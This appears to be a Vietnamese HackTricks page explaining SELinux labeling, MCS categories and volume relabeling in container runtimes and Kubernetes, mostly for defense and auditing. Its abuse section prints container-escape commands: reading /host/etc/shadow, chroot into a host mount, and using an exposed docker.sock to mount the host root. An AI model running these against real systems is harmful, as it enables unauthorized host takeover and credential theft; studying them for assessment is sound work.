# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Tổng quan

SELinux là một hệ thống **Kiểm soát truy cập bắt buộc dựa trên nhãn**. Mỗi tiến trình và đối tượng liên quan có thể mang một ngữ cảnh bảo mật, còn policy quyết định những domain nào có thể tương tác với những type nào và theo cách nào. Trong môi trường container, điều này thường có nghĩa là runtime khởi chạy tiến trình container trong một domain container bị giới hạn và gắn nhãn nội dung container bằng các type tương ứng. Nếu policy hoạt động đúng, tiến trình có thể đọc và ghi những thứ mà nhãn của nó được cho phép truy cập, đồng thời bị từ chối quyền truy cập vào nội dung khác trên host, ngay cả khi nội dung đó hiển thị thông qua một mount.

Đây là một trong những cơ chế bảo vệ mạnh nhất ở phía host trong các triển khai container Linux phổ biến. Cơ chế này đặc biệt quan trọng trên Fedora, RHEL, CentOS Stream, OpenShift và các hệ sinh thái khác lấy SELinux làm trọng tâm. Trong những môi trường đó, người đánh giá bỏ qua SELinux thường sẽ hiểu sai lý do một đường dẫn rõ ràng dẫn đến việc xâm phạm host lại thực sự bị chặn.

## AppArmor và SELinux

Khác biệt tổng quan dễ hiểu nhất là AppArmor dựa trên path, còn SELinux **dựa trên nhãn**. Điều này ảnh hưởng lớn đến bảo mật container. Policy dựa trên path có thể hoạt động khác đi nếu cùng nội dung trên host hiển thị dưới một đường dẫn mount không như dự kiến. Ngược lại, policy dựa trên nhãn sẽ xét nhãn của đối tượng và những gì domain của tiến trình được phép làm với đối tượng đó. Điều này không khiến SELinux trở nên đơn giản, nhưng giúp hệ thống chống lại một nhóm giả định về thủ thuật path mà đôi khi người phòng thủ vô tình mắc phải trên các hệ thống dùng AppArmor.

Vì mô hình này dựa trên nhãn, cách xử lý volume container và các quyết định gắn lại nhãn có ý nghĩa then chốt đối với bảo mật. Nếu runtime hoặc operator thay đổi nhãn quá rộng để “mount hoạt động”, ranh giới policy vốn được thiết kế để cô lập workload có thể yếu đi nhiều hơn dự kiến.

## Lab

Để kiểm tra SELinux có đang hoạt động trên host hay không:

```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```

Để kiểm tra các nhãn hiện có trên host:

```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```

Để so sánh một lần chạy bình thường với một lần chạy đã tắt cơ chế gán nhãn:

```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```

Trên host bật SELinux, đây là một minh họa rất thực tế vì nó cho thấy sự khác biệt giữa workload chạy trong domain container như dự kiến và workload đã bị gỡ bỏ lớp thực thi đó.

## Cách sử dụng trong runtime

Podman đặc biệt tương thích với SELinux trên các hệ thống có SELinux làm mặc định nền tảng. Rootless Podman kết hợp với SELinux là một trong những cấu hình nền bảo mật container phổ biến mạnh nhất, vì tiến trình vốn đã không có đặc quyền ở phía host và vẫn bị giới hạn bởi chính sách MAC. Docker cũng có thể sử dụng SELinux nếu được hỗ trợ, dù đôi khi quản trị viên vô hiệu hóa nó để khắc phục những vướng mắc khi gắn nhãn volume. CRI-O và OpenShift phụ thuộc nhiều vào SELinux như một phần trong cơ chế cô lập container. Kubernetes cũng có thể cung cấp các thiết lập liên quan đến SELinux, nhưng hiệu quả của chúng rõ ràng phụ thuộc vào việc hệ điều hành của node có hỗ trợ và thực thi SELinux hay không.<sup>[[2]](#references)</sup>

Bài học xuyên suốt là SELinux không phải một thứ trang trí tùy chọn. Trong các hệ sinh thái được xây dựng xoay quanh nó, SELinux là một phần của ranh giới bảo mật được kỳ vọng. Để tìm hiểu về việc liệt kê chính sách phía host, phân tích chuyển đổi và lạm dụng các công cụ quản trị SELinux, xem [trang SELinux tổng quát](../../../interesting-files-permissions/selinux.md).

## Danh mục MCS và gán lại nhãn volume

Cơ chế cô lập container thường là sự kết hợp giữa **thực thi theo kiểu** và **Multi-Category Security (MCS)**. Hai tiến trình có thể cùng chạy dưới dạng `container_t`, nhưng được gán các mức khác nhau như `s0:c123,c456` và `s0:c321,c654`. Nội dung riêng tư của container được gán nhãn `container_file_t` cùng với các danh mục tương ứng, vì vậy chỉ tiếp cận được đường dẫn của container khác thì vẫn chưa đủ để truy cập nội dung đó. Runtime thường tự cấp cặp danh mục; việc chủ động dùng lại một mức sẽ làm mất sự phân tách riêng cho từng container.<sup>[[3]](#references)</sup>

Hãy so sánh nhãn tiến trình và nhãn mount thay vì chỉ kiểm tra kiểu:<sup>[[3]](#references)</sup>

```bash
podman inspect --format 'process={{.ProcessLabel}} mount={{.MountLabel}}' <container>
podman top <container> label
ps -eZ | grep -E 'container_t|spc_t'
ls -Zd /path/to/bind-mount
```

Các hậu tố bind-mount thay đổi nhãn inode trên host, do đó thay đổi ranh giới bảo mật chứ không chỉ siêu dữ liệu mount:<sup>[[3]](#references)</sup>

- `:Z` áp dụng nhãn riêng tư với các danh mục MCS của container. Phù hợp với volume chỉ thuộc về một container hoặc Pod.
- `:z` áp dụng nhãn dùng chung để các container bị giới hạn khác cũng có thể sử dụng nội dung (phụ thuộc vào quyền DAC). Dùng tùy chọn này cho secret hoặc dữ liệu dành riêng cho từng tenant sẽ loại bỏ cơ chế cô lập MCS vốn phân tách các container.
- Việc gán lại nhãn được thực hiện đệ quy. Áp dụng một trong hai tùy chọn này cho các cây thư mục host rộng như `/`, `/etc`, `/usr` hoặc toàn bộ thư mục home có thể vừa làm lộ nội dung cho container được chọn, vừa khiến các dịch vụ host ngừng hoạt động do nhãn dự kiến của chúng bị thay thế.

Có thể dễ dàng nhận ra việc tái sử dụng level thủ công trong dòng lệnh và manifest. Hai container sau đây được chủ ý gán cùng một MCS level, do đó chúng có thể sử dụng nội dung được gắn nhãn cho level đó:<sup>[[3]](#references)</sup>

```bash
podman run --security-opt label=level:s0:c100,c200 ...
podman run --security-opt label=level:s0:c100,c200 ...
```

Cũng cần phân biệt `label=nested` với `label=disable`: tùy chọn thứ nhất cho phép thực hiện các thao tác SELinux bên trong container và chỉ cho phép thay đổi nhãn ở những nơi policy cho phép, còn tùy chọn thứ hai loại bỏ sự phân tách bằng nhãn đối với workload đó. Cả hai đều cần được rà soát, nhưng không tương đương nhau.<sup>[[3]](#references)</sup>

## Cấu hình sai

Sai lầm kinh điển là dùng `label=disable`. Trên thực tế, việc này thường xảy ra vì một lần mount volume bị từ chối, và giải pháp nhanh nhất trước mắt là loại bỏ SELinux khỏi phương trình thay vì sửa mô hình gán nhãn.<sup>[[1]](#references)</sup> Một lỗi phổ biến khác là gán nhãn lại nội dung trên host không chính xác. Các thao tác gán nhãn lại trên diện rộng có thể giúp ứng dụng hoạt động, nhưng cũng có thể mở rộng đáng kể phạm vi dữ liệu container được phép truy cập so với dự định ban đầu.

Điều quan trọng nữa là không nhầm lẫn giữa SELinux **được cài đặt** và SELinux **đang có hiệu lực**. Host có thể hỗ trợ SELinux nhưng vẫn đang ở chế độ permissive, hoặc runtime có thể không chạy workload trong domain dự kiến. Trong những trường hợp đó, mức độ bảo vệ yếu hơn nhiều so với những gì tài liệu mô tả.

## Lạm dụng

Khi SELinux không có, ở chế độ permissive hoặc bị vô hiệu hóa trên diện rộng đối với workload, các đường dẫn được mount từ host sẽ dễ bị lạm dụng hơn nhiều. Bind mount vốn sẽ bị giới hạn bằng nhãn có thể trở thành lối truy cập trực tiếp vào dữ liệu trên host hoặc để sửa đổi host. Điều này đặc biệt đáng lưu ý khi kết hợp với các volume mount có quyền ghi, thư mục của container runtime hoặc những giải pháp tạm thời trong vận hành khiến các đường dẫn nhạy cảm trên host bị lộ ra để tiện sử dụng.

SELinux thường giải thích vì sao một bài hướng dẫn breakout chung có thể hoạt động ngay trên host này nhưng liên tục thất bại trên host khác, dù các cờ runtime trông tương tự nhau. Yếu tố còn thiếu thường không phải namespace hay capability, mà là ranh giới nhãn vẫn còn nguyên vẹn.

Cách kiểm tra thực tế nhanh nhất là đối chiếu context đang hoạt động, sau đó thăm dò các đường dẫn được mount từ host hoặc các thư mục runtime vốn thường bị giới hạn bằng nhãn:

```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```

Nếu có host bind mount và SELinux labeling bị vô hiệu hóa hoặc làm suy yếu, information disclosure thường xảy ra đầu tiên:

```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```

Nếu mount có quyền ghi và từ góc độ kernel, container thực chất có quyền root trên host, bước tiếp theo là thử sửa đổi host có kiểm soát thay vì đoán mò:

```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```

Trên các host hỗ trợ SELinux, việc mất nhãn ở các thư mục trạng thái runtime cũng có thể làm lộ các đường dẫn leo thang đặc quyền trực tiếp:

```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```

Các lệnh này không thay thế cho một chuỗi escape hoàn chỉnh, nhưng giúp xác định rất nhanh liệu SELinux có phải là thứ ngăn truy cập dữ liệu trên host hoặc sửa đổi tệp phía host hay không.

### Ví dụ đầy đủ: SELinux bị vô hiệu hóa + mount host có quyền ghi

Nếu tính năng gắn nhãn SELinux bị vô hiệu hóa và filesystem trên host được mount với quyền ghi tại `/host`, việc escape hoàn toàn ra host trở thành một trường hợp lạm dụng bind mount thông thường:

```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```

Nếu `chroot` thành công, tiến trình container hiện đang hoạt động từ hệ thống tệp của host:

```bash
id
hostname
cat /etc/passwd | tail
```

### Ví dụ đầy đủ: SELinux bị vô hiệu hóa + Thư mục runtime

Nếu workload có thể truy cập socket runtime sau khi các nhãn bị vô hiệu hóa, có thể giao việc thoát khỏi container cho runtime:

```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```

Điều đáng chú ý là SELinux thường chính là cơ chế kiểm soát ngăn chặn kiểu truy cập vào đường dẫn trên host hoặc trạng thái runtime này.

## Kiểm tra

Mục tiêu của các bước kiểm tra SELinux là xác nhận SELinux đang được bật, xác định security context hiện tại và xem các tệp hoặc đường dẫn bạn quan tâm có thực sự bị giới hạn bằng nhãn hay không.

```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```

Điều đáng chú ý ở đây:

- `getenforce` lý tưởng nhất nên trả về `Enforcing`; `Permissive` hoặc `Disabled` sẽ làm thay đổi ý nghĩa của toàn bộ phần SELinux.
- Nếu context của process hiện tại trông bất thường hoặc quá rộng, workload có thể không chạy theo policy container dự kiến.
- Nếu các file được mount từ host hoặc các thư mục runtime có label cho phép process truy cập quá tự do, bind mount sẽ trở nên nguy hiểm hơn nhiều.

Khi xem xét container trên nền tảng hỗ trợ SELinux, đừng coi việc gán label là chi tiết thứ yếu. Trong nhiều trường hợp, đây là một trong những lý do chính khiến host chưa bị compromise.

## Mặc định của Runtime

| Runtime / nền tảng | Trạng thái mặc định | Hành vi mặc định | Cách nới lỏng phổ biến theo cách thủ công |
| --- | --- | --- | --- |
| Docker Engine | Phụ thuộc vào host | Có thể tách biệt bằng SELinux trên các host bật SELinux, nhưng hành vi cụ thể phụ thuộc vào cấu hình host/daemon | `--security-opt label=disable`, gán lại label trên diện rộng cho bind mount, `--privileged` |
| Podman | Thường được bật trên các host SELinux | Tách biệt bằng SELinux là tính năng thông thường của Podman trên các hệ thống SELinux, trừ khi bị tắt | `--security-opt label=disable`, `label=false` trong `containers.conf`, `--privileged` |
| Kubernetes | Runtime gán trên các node SELinux; có thể cấu hình rõ ràng | Runtime có thể cấp label riêng khi Pod không đặt label. `securityContext.seLinuxOptions` được cấu hình tường minh sẽ kiểm soát label của Pod/volume; trên Kubernetes 1.37, các volume đủ điều kiện mặc định sử dụng SELinux mount labeling | MCS level bị trùng lặp, node ở chế độ permissive/disabled, workload đặc quyền trên diện rộng, áp dụng `seLinuxChangePolicy: Recursive` bừa bãi <sup>[[2]](#references)[[4]](#references)</sup> |
| Các triển khai kiểu CRI-O / OpenShift | Thường được dựa vào rất nhiều | SELinux thường là phần cốt lõi của mô hình cô lập node trong các môi trường này | Policy tùy chỉnh mở rộng quyền truy cập quá mức, tắt labeling để tương thích |

Mặc định của SELinux phụ thuộc vào bản phân phối nhiều hơn so với mặc định của seccomp. Trên các hệ thống kiểu Fedora/RHEL/OpenShift, SELinux thường là phần cốt lõi của mô hình cô lập. Trên các hệ thống không có SELinux, tính năng này đơn giản là không tồn tại.

## Gán Label Volume trên Kubernetes 1.37

Kubernetes 1.37 đưa `SELinuxMount` lên trạng thái stable và bật tính năng này theo mặc định. Với PVC đủ điều kiện, Pod có `seLinuxOptions` và CSI driver khai báo `.spec.seLinuxMount: true`, kubelet sử dụng `-o context=<label>` thay vì yêu cầu runtime gán lại label đệ quy cho mọi inode. Các driver và loại volume không được hỗ trợ vẫn dùng phương thức đệ quy. Cách này tránh phải duyệt để gán lại label trên diện rộng, đồng thời tránh thay đổi label persistent của mọi file chỉ để cung cấp volume cho Pod.<sup>[[2]](#references)[[4]](#references)</sup>

Một mount chỉ có thể mang một context như vậy. Do đó, theo hành vi `MountOption` mặc định, các Pod có **SELinux label khác nhau** dùng chung một volume đủ điều kiện trên cùng node sẽ không thể cùng hoạt động: một Pod sẽ vẫn ở trạng thái `ContainerCreating` với lỗi `conflicting SELinux labels of volume`. Hãy xem đây vừa là vấn đề về tính sẵn sàng, vừa là dấu hiệu hữu ích cho thấy các workload đã ngầm chia sẻ storage qua các ranh giới MCS. Nếu việc chia sẻ đó là có chủ ý — ví dụ, một Pod đặc quyền `spc_t` và một Pod bị giới hạn cùng dùng một volume — tùy chọn bỏ qua để đảm bảo tương thích ở cấp Pod là `seLinuxChangePolicy: Recursive`; đừng áp dụng tùy chọn này trên toàn cluster nếu chưa hiểu runtime sẽ gán lại label cho những đường dẫn nào.<sup>[[2]](#references)[[4]](#references)</sup>

```yaml
spec:
  securityContext:
    seLinuxOptions:
      level: "s0:c123,c456"
    seLinuxChangePolicy: Recursive
```

Các bước kiểm tra hữu ích từ phía cluster:<sup>[[2]](#references)</sup>

```bash
# Drivers that opt in to -o context= volume mounts
kubectl get csidriver -o custom-columns=NAME:.metadata.name,SELINUX_MOUNT:.spec.seLinuxMount

# Explicit levels or recursive-policy exceptions
kubectl get pods -A -o json | jq -r '
  .items[] |
  select(.spec.securityContext.seLinuxOptions or
         .spec.securityContext.seLinuxChangePolicy) |
  [.metadata.namespace,.metadata.name,
   (.spec.securityContext.seLinuxOptions.level // "-"),
   (.spec.securityContext.seLinuxChangePolicy // "MountOption")] | @tsv'

# Start failures and warnings caused by incompatible labels
kubectl get events -A --sort-by=.lastTimestamp |
  grep -Ei 'SELinux|conflicting SELinux labels'
```

Bộ điều khiển `selinux-warning-controller` tùy chọn của kube-controller-manager phát hiện các Pod dùng chung volume nhưng có nhãn không tương thích và cung cấp metric `selinux_warning_controller_selinux_volume_conflict`. Hãy bật và kiểm tra bộ điều khiển này trước khi nâng cấp hoặc thay đổi cách gán nhãn volume; nó giúp phân biệt xung đột policy thực sự với lỗi CSI hoặc hệ thống tệp thông thường.<sup>[[2]](#references)</sup>

## References

- [1] [Tài liệu Podman: --security-opt=option (label=disable)](https://docs.podman.io/en/v4.6.0/markdown/options/security-opt.html)
- [2] [Kubernetes: Cấu hình Security Context cho Pod hoặc Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [3] [Tài liệu lệnh podman run: Nhãn SELinux và gán lại nhãn volume](https://docs.podman.io/en/latest/markdown/podman-run.1.html)
- [4] [Bản phát hành Kubernetes v1.37: SELinuxMount và SELinuxChangePolicy](https://kubernetes.io/blog/2026/08/26/kubernetes-v1-37-release/)
{{#include ../../../../banners/hacktricks-training.md}}
